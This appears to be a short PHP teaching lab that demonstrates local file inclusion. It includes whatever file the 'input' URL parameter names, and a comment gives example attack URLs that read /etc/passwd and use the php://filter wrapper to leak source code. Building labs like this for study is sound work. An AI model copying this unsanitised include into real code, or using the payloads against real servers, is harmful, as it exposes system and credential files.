<!-- http://localhost:8000/lfi.php?input=/etc/passwd 
Introudce the idea of wrappers: http://localhost:8000/lfi.php?input=php://filter/convert.base64-encode/resource=index.php -->

<p> Usage example: http://localhost:8000/lfi.php?input=index </p>

<?php

$input = $_GET["input"];

include($input);

?>
